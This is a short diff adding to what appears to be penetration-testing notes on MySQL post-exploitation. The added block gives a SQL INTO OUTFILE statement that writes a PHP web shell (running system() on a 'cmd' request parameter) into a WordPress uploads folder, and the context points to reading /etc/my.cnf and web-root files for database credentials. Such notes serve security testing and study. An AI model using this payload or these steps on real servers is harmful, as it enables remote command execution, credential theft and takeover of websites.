@@ -361,6 +361,10 @@ If you get this error, the server is set up to only allow login from 127.0.0.1, 
 
 If you can access it from the web you can usually use it to outfile a shell to a public web path.
 
+```
+SELECT '<?php system($_GET[\'cmd\']) ?>' INTO OUTFILE "/var/www/https/blogblog/wp-content/uploads/shell2.php";
+```
+
 **cat /etc/my.cnf**: config file path
 
 A file in the web root often has the creds for the database.
